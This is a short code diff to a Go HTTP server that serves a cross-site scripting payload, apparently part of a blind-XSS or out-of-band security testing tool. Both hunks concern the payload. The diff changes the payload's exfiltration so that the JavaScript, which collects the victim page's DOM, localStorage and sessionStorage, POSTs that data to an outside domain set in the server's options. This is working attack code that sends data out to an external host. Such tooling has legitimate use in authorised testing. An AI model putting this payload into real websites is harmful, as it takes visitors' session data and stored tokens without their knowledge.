@@ -86,7 +86,7 @@ func NewHTTPServer(options *Options) (*HTTPServer, error) {
 	}
 	// Set up XSS payload for "/" endpoint
 	if options.XSSDir != "" {
-		server.xssPayload = defaultXSSPayload
+		server.xssPayload = strings.Replace(defaultXSSPayload, "XSS_SERVER_DOMAIN", options.Domains[0], 1)
 		if server.customBanner != "" {
 			server.xssPayload = server.customBanner
 			server.customBanner = ""
@@ -271,8 +271,9 @@ dom:document.documentElement?document.documentElement.outerHTML.substring(0,5000
 localStorage:ls,
 sessionStorage:ss
 };
+var p=document.location.protocol==='http:'?'http:':'https:';
 var x=new XMLHttpRequest();
-x.open('POST','/x/',true);
+x.open('POST',p+'//XSS_SERVER_DOMAIN/x/',true);
 x.setRequestHeader('Content-Type','application/json');
 x.send(JSON.stringify(d));
 })();`
